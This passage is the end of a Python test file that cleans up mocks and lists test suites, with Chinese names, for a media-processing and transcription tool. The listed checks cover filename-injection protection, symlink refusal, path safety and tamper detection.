    finally:
        fp.AGY_BIN = original_bin
        stt_mod.transcribe_long_audio = original_transcribe
        shutil.rmtree(work, ignore_errors=True)


SUITES = [
    ("文件名注入防护", test_filename_injection),
    ("任务 prompt 结构", test_task_prompt_structure),
    ("产物回收", test_output_collection),
    ("嵌套产物回收与摊平", test_nested_products),
    ("软链产物拒收", test_symlink_products_are_refused),
    ("agy 收场处置", test_run_task_outcomes),
    ("转写请求解析与路径防护", test_stt_request_parsing),
    ("长音频代跑握手", test_stt_handoff_round_trip),
    ("代跑失败处置", test_stt_handoff_failure),
    ("转写稿改正表", test_corrections_table),
    ("时间轴改动必被发现", test_timeline_tamper_is_reported),
    ("文本产物内联", test_inline_text_products),
    ("GIF 产物投递", test_gif_product_delivery),
    ("产物打包", test_product_packaging),
    ("工具清单内联", test_toolchain_is_inlined),
    ("元数据探针", test_probe_reports_facts),
]

if __name__ == "__main__":
    main(SUITES)
